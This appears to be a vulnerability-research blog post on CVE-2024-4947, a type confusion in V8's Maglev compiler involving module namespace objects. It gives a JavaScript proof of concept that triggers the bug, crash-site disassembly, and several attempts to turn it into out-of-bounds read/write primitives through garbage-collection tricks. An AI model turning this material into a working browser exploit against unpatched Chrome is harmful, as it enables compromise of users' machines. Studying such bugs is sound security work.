#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
</style>




<body>
    <div id="header">
<h1 class="postTitle">CVE-2024-4947: v8 incorrect AccessInfo for module namespace object causes Maglev type confusion</h1>
<div class="title-right">
    <a href="https://zckevin.github.io/blog" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/zckevin/blog/issues/2" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><p>author: <a href="https://x.com/buptdsb" rel="nofollow">@buptdsb</a>, <a href="https://x.com/mistymntncop" rel="nofollow">@mistymntncop</a><br>
2024-05-19 09:07:47</p>
<h1>Info</h1>
<p><a href="https://chromereleases.googleblog.com/2024/05/stable-channel-update-for-desktop_15.html" rel="nofollow">https://chromereleases.googleblog.com/2024/05/stable-channel-update-for-desktop_15.html</a><br>
[TBD][340221135] High <a title="CVE-2024-4947" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-p8v3-5hqq-7c5r/hovercard" href="https://github.com/advisories/GHSA-p8v3-5hqq-7c5r">CVE-2024-4947</a>: Type Confusion in V8. Reported by Vasily Berdnikov (@vaber_b) and Boris Larin (<a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/oct0xor/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/oct0xor">@oct0xor</a>) of Kaspersky on 2024-05-13<br>
Google is aware that an exploit for <a title="CVE-2024-4947" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-p8v3-5hqq-7c5r/hovercard" href="https://github.com/advisories/GHSA-p8v3-5hqq-7c5r">CVE-2024-4947</a> exists in the wild.</p>
<p><a href="https://chromium-review.googlesource.com/c/v8/v8/+/5534518" rel="nofollow">https://chromium-review.googlesource.com/c/v8/v8/+/5534518</a></p>
<p>git checkout 473318dfdb09464902c7633cad03b16431145800 -b <a title="CVE-2024-4947" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-p8v3-5hqq-7c5r/hovercard" href="https://github.com/advisories/GHSA-p8v3-5hqq-7c5r">CVE-2024-4947</a></p>
<h1>PoC</h1>
<div class="highlight highlight-source-js"><pre class="notranslate"><span class="pl-c">// run with: `/d8 --allow-natives-syntax --maglev --expose-gc --soft-abort --trace-deopt 22.mjs`</span>
<span class="pl-k">import</span> <span class="pl-c1">*</span> <span class="pl-k">as</span> <span class="pl-s1">ns</span> <span class="pl-k">from</span> <span class="pl-s">"./22.mjs"</span><span class="pl-kos">;</span>

<span class="pl-k">export</span> <span class="pl-k">let</span> <span class="pl-s1">c</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span><span class="pl-kos">;</span>

<span class="pl-k">function</span> <span class="pl-en">to_fast</span><span class="pl-kos">(</span><span class="pl-s1">o</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
  <span class="pl-k">var</span> <span class="pl-s1">dummy</span> <span class="pl-c1">=</span> <span class="pl-kos">{</span><span class="pl-s">'unique'</span>:<span class="pl-c1">5</span><span class="pl-kos">}</span><span class="pl-kos">;</span>
  <span class="pl-s1">dummy</span><span class="pl-kos">.</span><span class="pl-c1">__proto__</span> <span class="pl-c1">=</span> <span class="pl-s1">o</span><span class="pl-kos">;</span>                                                                                                                                                                                                                 
  <span class="pl-s1">dummy</span><span class="pl-kos">.</span><span class="pl-c1">__proto__</span> <span class="pl-c1">=</span> <span class="pl-s1">o</span><span class="pl-kos">;</span> <span class="pl-c">//OptimizeAsFastPrototype</span>
<span class="pl-kos">}</span>
<span class="pl-en">to_fast</span><span class="pl-kos">(</span><span class="pl-s1">ns</span><span class="pl-kos">)</span><span class="pl-kos">;</span>

<span class="pl-k">function</span> <span class="pl-en">store</span><span class="pl-kos">(</span><span class="pl-s1">target</span><span class="pl-kos">,</span> <span class="pl-s1">v</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
  <span class="pl-s1">target</span><span class="pl-kos">.</span><span class="pl-c1">c</span> <span class="pl-c1">=</span> <span class="pl-s1">v</span><span class="pl-kos">;</span>
<span class="pl-kos">}</span>

<span class="pl-k">function</span> <span class="pl-en">createObject</span><span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
  <span class="pl-k">let</span> <span class="pl-s1">a</span> <span class="pl-c1">=</span> <span class="pl-kos">{</span><span class="pl-kos">}</span><span class="pl-kos">;</span>
  <span class="pl-s1">a</span><span class="pl-kos">.</span><span class="pl-c1">i1</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span><span class="pl-kos">;</span>
  <span class="pl-s1">a</span><span class="pl-kos">.</span><span class="pl-c1">i2</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span><span class="pl-kos">;</span>
  <span class="pl-s1">a</span><span class="pl-kos">.</span><span class="pl-c1">i3</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span><span class="pl-kos">;</span>
  <span class="pl-s1">a</span><span class="pl-kos">.</span><span class="pl-c1">i4</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span><span class="pl-kos">;</span>
  <span class="pl-c">// -----------------</span>
  <span class="pl-k">for</span> <span class="pl-kos">(</span><span class="pl-k">let</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span><span class="pl-kos">;</span> <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">8</span><span class="pl-kos">;</span> <span class="pl-s1">i</span><span class="pl-c1">++</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
    <span class="pl-s1">a</span><span class="pl-kos">[</span><span class="pl-s">`p<span class="pl-s1"><span class="pl-kos">${</span><span class="pl-s1">i</span><span class="pl-kos">}</span></span>`</span><span class="pl-kos">]</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span><span class="pl-kos">;</span>
  <span class="pl-kos">}</span>
  <span class="pl-k">return</span> <span class="pl-s1">a</span><span class="pl-kos">;</span>
<span class="pl-kos">}</span>

<span class="pl-k">function</span> <span class="pl-en">init</span><span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
  <span class="pl-k">let</span> <span class="pl-s1">a</span> <span class="pl-c1">=</span> <span class="pl-en">createObject</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
  <span class="pl-s1">a</span><span class="pl-kos">.</span><span class="pl-c1">__proto__</span> <span class="pl-c1">=</span> <span class="pl-s1">ns</span><span class="pl-kos">;</span>
  <span class="pl-c">// %DebugPrint(a);</span>
  <span class="pl-k">return</span> <span class="pl-s1">a</span><span class="pl-kos">;</span>
<span class="pl-kos">}</span>

<span class="pl-kos">(</span><span class="pl-k">function</span><span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
  <span class="pl-c1">%</span><span class="pl-v">PrepareFunctionForOptimization</span><span class="pl-kos">(</span><span class="pl-s1">store</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
  <span class="pl-en">store</span><span class="pl-kos">(</span><span class="pl-en">init</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">,</span> <span class="pl-c1">0</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
  
  <span class="pl-c1">%</span><span class="pl-v">OptimizeMaglevOnNextCall</span><span class="pl-kos">(</span><span class="pl-s1">store</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
  <span class="pl-en">store</span><span class="pl-kos">(</span><span class="pl-en">init</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">,</span> <span class="pl-c1">0</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-kos">}</span><span class="pl-kos">)</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>

<span class="pl-k">function</span> <span class="pl-en">confuse_properties_map</span><span class="pl-kos">(</span><span class="pl-s1">arg</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
  <span class="pl-en">store</span><span class="pl-kos">(</span><span class="pl-s1">arg</span><span class="pl-kos">,</span> <span class="pl-c1">0x1</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-kos">}</span>

<span class="pl-k">let</span> <span class="pl-s1">a</span> <span class="pl-c1">=</span> <span class="pl-en">init</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-k">let</span> <span class="pl-s1">arr</span> <span class="pl-c1">=</span> <span class="pl-kos">[</span><span class="pl-kos">]</span><span class="pl-kos">;</span>
<span class="pl-s1">arr</span><span class="pl-kos">.</span><span class="pl-en">push</span><span class="pl-kos">(</span><span class="pl-c1">1.1</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-k">let</span> <span class="pl-s1">arr2</span> <span class="pl-c1">=</span> <span class="pl-kos">[</span><span class="pl-kos">{</span><span class="pl-kos">}</span><span class="pl-kos">]</span><span class="pl-kos">;</span>
<span class="pl-en">confuse_properties_map</span><span class="pl-kos">(</span><span class="pl-s1">a</span><span class="pl-kos">)</span><span class="pl-kos">;</span>

<span class="pl-en">gc</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>

<span class="pl-c">// %DebugPrint(a);</span>
<span class="pl-c">// %DebugPrint(arr);</span>

<span class="pl-s1">a</span><span class="pl-kos">.</span><span class="pl-c1">p5</span> <span class="pl-c1">=</span> <span class="pl-c1">1024</span><span class="pl-kos">;</span>
<span class="pl-s1">a</span><span class="pl-kos">.</span><span class="pl-c1">p7</span> <span class="pl-c1">=</span> <span class="pl-c1">1024</span><span class="pl-kos">;</span>
<span class="pl-c1">%</span><span class="pl-v">DebugPrint</span><span class="pl-kos">(</span><span class="pl-s1">arr</span><span class="pl-kos">)</span><span class="pl-kos">;</span>

<span class="pl-c">// %SystemBreak();</span></pre></div>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/d27db6bb-e34f-4a27-8681-7f689bb1c5cf"><img src="https://github.com/zckevin/blog/assets/666724/d27db6bb-e34f-4a27-8681-7f689bb1c5cf" alt="image" style="max-width: 100%;"></a></p>
<h1>where bug happens</h1>
<h2>source code</h2>
<pre class="notranslate"><code class="notranslate">PropertyAccessInfo AccessorAccessInfoHelper() {
  ...
  return PropertyAccessInfo::ModuleExport(zone, receiver_map,
                                            cell_ref.value());
}


PropertyAccessInfo PropertyAccessInfo::ModuleExport(Zone* zone,
                                                    MapRef receiver_map,
                                                    CellRef cell) {
  return PropertyAccessInfo(zone, kModuleExport, {} /* holder */,
                            cell /* constant */, {} /* api_holder */,
                            {} /* name */, {{receiver_map}, zone});
}


ReduceResult MaglevGraphBuilder::TryBuildStoreField(...) {
  ...
  ValueNode* store_target;
  if (field_index.is_inobject()) {    &lt;--- false
    store_target = receiver;
  } else {
    // The field is in the property array, first load it from there.
    store_target = AddNewNode&lt;LoadTaggedField&gt;({receiver}, JSReceiver::kPropertiesOrHashOffset);
  }
...
  if (field_representation.IsSmi()) {     &lt;------ field_representation is `none` for a `kModuleExport` AccessInfo
    ...
  } else if (value-&gt;use_double_register()) {
    ...
  } else {
    BuildStoreTaggedField(store_target, value, field_index.offset()); &lt;---------- field index offset is 0
  }

}
</code></pre>
<h2>crash site</h2>
<pre class="notranslate"><code class="notranslate">0x7fe1e00001d6   196  8b7803               movl rdi,[rax+0x3]                                                                                                                                                                 
0x7fe1e00001d9   199  4903fe               REX.W addq rdi,r14                                                                                                                                                                          
...
0x7fe1e0000225   1e5  8947ff               movl [rdi-0x1],rax           &lt;--- crash                                                                  
</code></pre>
<p>$rax is the receiver, [rax+0x3] is receiver’s properties</p>
<p>$r14 seems like to be the ptr compression cage base pointer?<br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/98887842-3f31-48ed-9f58-31375e4dbb22"><img src="https://github.com/zckevin/blog/assets/666724/98887842-3f31-48ed-9f58-31375e4dbb22" alt="image" style="max-width: 100%;"></a></p>
<p><code class="notranslate">properties</code> is a FixedArray, as the write offset is 0, we are writing to <code class="notranslate">FixedArray</code>’s map, which lives in ReadOnlySpace:<br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/824e7000-1a29-43ac-b768-d12099dc0ae6"><img src="https://github.com/zckevin/blog/assets/666724/824e7000-1a29-43ac-b768-d12099dc0ae6" alt="image" style="max-width: 100%;"></a><br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/526a5952-7455-47a0-9626-394015c3eeab"><img src="https://github.com/zckevin/blog/assets/666724/526a5952-7455-47a0-9626-394015c3eeab" alt="image" style="max-width: 100%;"></a></p>
<p>Now we have a primitive: <code class="notranslate">mov [[object_addr + 4] + 0], rax</code>,<br>
which means we could write any integer into a jsobject’s propertyarray’s map field</p>
<h1>Research timeline</h1>
<h2>Failed attempt 1: an oob write using hash value write</h2>
<p>As we have a type confusion primitive, then i open the map.h layout,<br>
seems like the only field which could be used in a PropertyArray map is <code class="notranslate">instance_type</code>.<br>
Other fields are for JSObjects.</p>
<p>For maglev optimization to work, we MUST have a fast jsobject,<br>
For a fast jsobject, it could be confused with a dict mode jsobject, which instance_type is dict.<br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/fe5120c2-2448-4216-a5e2-8251605fd780"><img src="https://github.com/zckevin/blog/assets/666724/fe5120c2-2448-4216-a5e2-8251605fd780" alt="image" style="max-width: 100%;"></a></p>
<p>So we start grep code with <code class="notranslate">IsPropertyArray()</code>:</p>
<p>Try confuse a fast PropertyArray -&gt; Dictionary, then set hash on this fast object,<br>
as the hash store position is different in these two types, we MAY write oob into another array’s length field.<br>
Although the hash value is a random smi, in most times it’s value is greater than 0, so it’s ok to be an array’s length.<br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/4cff4269-0d60-4e52-ade9-a745369f4cf1"><img src="https://github.com/zckevin/blog/assets/666724/4cff4269-0d60-4e52-ade9-a745369f4cf1" alt="image" style="max-width: 100%;"></a></p>
<p>Now we have another primitive:<br>
oob write any <strong>smi value</strong> into field index 4(the 5th element) of a propertyarray</p>
<h3>failed code snippet 1</h3>
<p>demo code using sandbox api:</p>
<pre class="notranslate"><code class="notranslate">let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

let dict = {};
dict.a = 1;
delete dict.a;

let dict_properties = memory.getUint32(Sandbox.getAddressOf(dict) + 4, true);
let dict_properties_map_addr = memory.getUint32(dict_properties - 1, true);

let foo = {};
foo.p1 = 1;
foo.p2 = 1;
foo.p3 = 1;
foo.p4 = 1;
foo.p5 = 1;
%DebugPrint(foo);

let properties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);
memory.setUint32(properties - 1, dict_properties_map_addr, true);

const ws = new WeakSet();
ws.add(foo);

%SystemBreak();
</code></pre>
<p>The fixedarray set aborts in <code class="notranslate">CodeStubAssembler::FixedArrayBoundsCheck()</code>, it’s a CSA_CHECK, not DCHECK.<br>
Cause we will load hash value and compare the value with kNoHashSentinel(int value 0) first,<br>
the fixedarray load in CSA has bound check enabled by default.<br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/ce6864c6-f6c1-4dfc-90d4-3d55cc009392"><img src="https://github.com/zckevin/blog/assets/666724/ce6864c6-f6c1-4dfc-90d4-3d55cc009392" alt="image" style="max-width: 100%;"></a></p>
<h3>create hash take 2</h3>
<p>Find that we could use map normalization to trigger hash creation:</p>
<pre class="notranslate"><code class="notranslate">function set_hash(arg) {
    let sb = {a2222222221: 1, a2222222222 : 1};
    sb.__proto__ = arg;
    delete sb.a2222222222;
}
set_hash(obj);
</code></pre>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/d816dea9-9d16-49fd-96cb-7358d9db5d78"><img src="https://github.com/zckevin/blog/assets/666724/d816dea9-9d16-49fd-96cb-7358d9db5d78" alt="image" style="max-width: 100%;"></a></p>
<h3>try to create 1-length PropertyArray</h3>
<p>This hash value oob write is quite weak:<br>
write smi only, we can’t change any map address to trigger confusion<br>
cause we are doing a CAS alike operation, the hash creation function’s check part needs the field value to be 0 at first<br>
since most propertyarrays has unused elements allocated, we could only write to the second field of the adjacent v8 object<br>
prototype_maps can have 1-length PropertyArray, but can't have transition-tree, so can't be optizmized by ML/TF<br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/317b9b96-6204-43dd-a3da-c2bd6026ffa1"><img src="https://github.com/zckevin/blog/assets/666724/317b9b96-6204-43dd-a3da-c2bd6026ffa1" alt="image" style="max-width: 100%;"></a></p>
<p>Most FixedArrays have a <code class="notranslate">empty_fixed_array()</code> alike objects in heap roots</p>
<ul>
<li>Other objects like fixedarray:</li>
<li>Regex match info</li>
<li>feedback vector</li>
<li>...</li>
</ul>
<p>Seems too internal to be controlled from user js</p>
<h2>Failed attempt 2: using gc</h2>
<p>Two objects are located adjacently after gc,<br>
if one propertyarray’s length is shrinked, the jsarray’s length is intact,<br>
then we may trigger a oob read?</p>
<p>Demo:</p>
<pre class="notranslate"><code class="notranslate">let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

let foo = {};
let bar = {};
foo.p1 = 1;
foo.p2 = 1;
foo.p3 = 1;
foo.p4 = 1;
// ---------
foo.p5 = 1;
foo.p6 = 1;
foo.p7 = 1;
foo.p8 = 1;

bar.p1 = 1;
bar.p2 = 1;
bar.p3 = 1;
bar.p4 = 1;
bar.p5 = 1;

%DebugPrint(foo);
%DebugPrint(bar);

properties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);
memory.setUint32(properties - 1 + 4, 0x6, true);

// %DebugPrint(foo.p8);

gc();

%DebugPrint(foo);
%DebugPrint(bar);

properties = memory.getUint32(Sandbox.getAddressOf(foo) + 4, true);
memory.setUint32(properties - 1 + 4, 0x12, true);

%DebugPrint(foo.p8);

%SystemBreak();
</code></pre>
<p>As we can only override the propertyarray’s map, not the propertyarray itself<br>
and the map of it has variable length(which is 0)</p>
<h2>gc take 2</h2>
<p>We could confuse a propertyarray’s map -&gt; heapnumber’s map,<br>
then trigger a gc, then the propertyarray’s body would shrink and we have a oob read/write.</p>
<p>Since most (internal) maps are copied from the snapshot blob into heap, and there addresses are fixed.<br>
(the addrs may differ in different chrome versions?)</p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/a57124c9-9c8d-4ea4-aacf-27da912f25bd"><img src="https://github.com/zckevin/blog/assets/666724/a57124c9-9c8d-4ea4-aacf-27da912f25bd" alt="image" style="max-width: 100%;"></a></p>
<p>we could create a layout graph:</p>
<pre class="notranslate"><code class="notranslate">-------------
jsobject’s properties map
length
&lt;body&gt;
-------------
jsarray map
properties ptr
elements ptr
length            &lt;- p5
-------------
jsarray’s elements map
length            &lt;- p7
&lt;body&gt;
-------------
</code></pre>
<p>before gc:<br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/adb52099-16d5-405f-813c-65d3e0688a09"><img src="https://github.com/zckevin/blog/assets/666724/adb52099-16d5-405f-813c-65d3e0688a09" alt="image" style="max-width: 100%;"></a></p>
<p>after gc:<br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/11aebdc1-6174-427a-8c0a-2c6dcd0e3a45"><img src="https://github.com/zckevin/blog/assets/666724/11aebdc1-6174-427a-8c0a-2c6dcd0e3a45" alt="image" style="max-width: 100%;"></a></p>
<h2>gc after PropertyArray type confused with a string</h2>
<p>After calling <code class="notranslate">confuse_properties_map(a)</code>, we have set properties map ptr into 0x2f0000000002 (smi value)</p>
<p>Then in gc(), it would take the memory range from 0x2f0000000002-1 as a Map.<br>
Other fields are irrelevant except the <code class="notranslate">instance_type</code>, since that decides which apply function to call.<br>
If it’s not a valid type, the large switch loop would fall into default case and abort.</p>
<p>As the <code class="notranslate">instance_type</code> is 0 for now, it’s <code class="notranslate">INTERNALIZED_TWO_BYTE_STRING_TYPE</code>,<br>
so we will call <code class="notranslate">CALL_APPLY(SeqTwoByteString)</code> to gc this object.</p>
<p>For SeqTwoByteString, the <code class="notranslate">IterateBody</code> is a no-op. GC just move the whole string range from one place<br>
to another.</p>
<p>The layout of a js string is: <code class="notranslate">map | raw_hash_field | int32 length | ...</code><br>
So the length of this string is 0x02, the whole length of the heapobject is 16(3 * 4 + 2 * 2),<br>
then after gc, propertyarray would have 2 elements inside, other elements are dropped.</p>
<p>pic: &lt;the map from 0x2f0000000002-1&gt;<br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/8bc8b4d7-8210-4e80-855a-2fcc76b448e7"><img src="https://github.com/zckevin/blog/assets/666724/8bc8b4d7-8210-4e80-855a-2fcc76b448e7" alt="image" style="max-width: 100%;"></a></p>
<p>pic:<br>
&lt;SeqTwoByteString, map / raw_hash_field / length / string body&gt;<br>
&lt;PropertyArray, map / length / element 0 / element 1&gt;<br>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/zckevin/blog/assets/666724/7c36c2af-e6de-49f3-bd91-041520c94b17"><img src="https://github.com/zckevin/blog/assets/666724/7c36c2af-e6de-49f3-bd91-041520c94b17" alt="image" style="max-width: 100%;"></a></p>
<pre class="notranslate"><code class="notranslate">template &lt;typename ObjectVisitor&gt;
void HeapObject::IterateBodyFast(PtrComprCageBase cage_base, ObjectVisitor* v) {
  Tagged&lt;Map&gt; m = map(cage_base);
  IterateBodyFast(m, SizeFromMap(m), v);
}

template &lt;typename ObjectVisitor&gt;
void HeapObject::IterateBodyFast(Tagged&lt;Map&gt; map, int object_size,
                                 ObjectVisitor* v) {
  BodyDescriptorApply&lt;CallIterateBody&gt;(map-&gt;instance_type(), map, *this,
                                       object_size, v);
}

template &lt;typename Op, typename... Args&gt;
auto BodyDescriptorApply(InstanceType type, Args&amp;&amp;... args) {
  switch (type) {
      case kSeqStringTag:
          return CALL_APPLY(SeqOneByteString);
    ...
    default:
UNREACHABLE();	
  }
}

class SeqOneByteString::BodyDescriptor final : public DataOnlyBodyDescriptor {
  ...
}

class DataOnlyBodyDescriptor : public BodyDescriptorBase {
 public:
  template &lt;typename ObjectVisitor&gt;
  static inline void IterateBody(Tagged&lt;Map&gt; map, Tagged&lt;HeapObject&gt; obj,
                                 int object_size, ObjectVisitor* v) {}      &lt;-------- noop here
};

template &lt;class Visitor&gt;
void LiveObjectVisitor::VisitMarkedObjectsNoFail(PageMetadata* page,
                                                 Visitor* visitor) {
  for (auto [object, size] : LiveObjectRange(page)) {
    const bool success = visitor-&gt;Visit(object, size);
   }
}

bool LiveObjectRange::iterator::AdvanceToNextMarkedObject() {
  ...
        current_size_ = ALIGN_TO_ALLOCATION_ALIGNMENT(
          current_object_-&gt;SizeFromMap(current_map_));
}

int HeapObject::SizeFromMap(Tagged&lt;Map&gt; map) const {
  ...
  if (instance_type == SEQ_TWO_BYTE_STRING_TYPE ||
      instance_type == INTERNALIZED_TWO_BYTE_STRING_TYPE ||
      instance_type == SHARED_SEQ_TWO_BYTE_STRING_TYPE) {
    // Strings may get concurrently truncated, hence we have to access its
    // length synchronized.
    return SeqTwoByteString::SizeFor(
        SeqTwoByteString::unchecked_cast(*this)-&gt;length(kAcquireLoad));
  }
}

V8_INLINE constexpr int32_t SeqTwoByteString::SizeFor(int32_t length) {
  return OBJECT_POINTER_ALIGN(SeqTwoByteString::DataSizeFor(length));
}
</code></pre>
<p>Stack trace for gc:</p>
<pre class="notranslate"><code class="notranslate">#0  v8::internal::CallIterateBody::apply&lt;v8::internal::SeqOneByteString::BodyDescriptor, false, v8::internal::RecordMigratedSlotVisitor&gt; (map=..., obj=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1506
#1  0x00007f6ecd5be46e in v8::internal::BodyDescriptorApply&lt;v8::internal::CallIterateBody, v8::internal::Tagged&lt;v8::internal::Map&gt;&amp;, v8::internal::HeapObject&amp;, int&amp;, v8::internal::RecordMigratedSlotVisitor*&amp;&gt; (type=v8::internal::SEQ_ONE_BYTE_STRING_TYPE, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578, args=@0x7fff5e191ea0: 0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1165
#2  0x00007f6ecd5be3b5 in v8::internal::HeapObject::IterateBodyFast&lt;v8::internal::RecordMigratedSlotVisitor&gt; (this=0x7fff5e1920f8, map=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1512
#3  0x00007f6ecd5cf6e4 in v8::internal::HeapObject::IterateFast&lt;v8::internal::RecordMigratedSlotVisitor&gt; (this=0x7fff5e1920f8, map=..., object_size=20, v=0x5635fee63578) at ../../src/objects/objects-body-descriptors-inl.h:1479
#4  0x00007f6ecd5cef02 in v8::internal::EvacuateVisitorBase::RawMigrateObject&lt;(v8::internal::EvacuateVisitorBase::MigrationMode)0&gt; (base=0x5635fee63598, dst=..., src=..., size=20, dest=v8::internal::OLD_SPACE) at ../../src/heap/mark-compact.cc:1503
#5  0x00007f6ecd5d0374 in v8::internal::EvacuateVisitorBase::MigrateObject (this=0x5635fee63598, dst=..., src=..., size=20, dest=v8::internal::OLD_SPACE) at ../../src/heap/mark-compact.cc:1626
#6  0x00007f6ecd5d0138 in v8::internal::EvacuateVisitorBase::TryEvacuateObject (this=0x5635fee63598, target_space=v8::internal::OLD_SPACE, object=..., size=20, target_object=0x7fff5e1922e0) at ../../src/heap/mark-compact.cc:1602
#7  0x00007f6ecd5cea9f in v8::internal::EvacuateNewSpaceVisitor::Visit (this=0x5635fee63598, object=..., size=20) at ../../src/heap/mark-compact.cc:1669
#8  0x00007f6ecd5b2761 in v8::internal::LiveObjectVisitor::VisitMarkedObjectsNoFail&lt;v8::internal::EvacuateNewSpaceVisitor&gt; (page=0x5635fee4fd40, visitor=0x5635fee63598) at ../../src/heap/mark-compact.cc:4235
#9  0x00007f6ecd5901e4 in v8::internal::Evacuator::RawEvacuatePage (this=0x5635fee62bd0, page=0x5635fee4fd40) at ../../src/heap/mark-compact.cc:4253
#10 0x00007f6ecd58fe80 in v8::internal::Evacuator::EvacuatePage (this=0x5635fee62bd0, page=0x5635fee4fd40) at ../../src/heap/mark-compact.cc:4162
</code></pre></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>
<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>
</div>
    <div id="footer">Copyright © <span id="year"></span><a href="https://zckevin.github.io/blog"> @buptdsb's Blog </a>
<p>
<span id="runday"></span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a>
</p>

<script>
if(""!=""){
    var now=new Date();
    var startSite=new Date("");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("year").innerHTML=now.getFullYear();
    if(""!=""){document.getElementById("runday").innerHTML=" • "+"网站运行"+diffDay+"天"+" • ";}
    else{document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";}
}
</script>
</div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 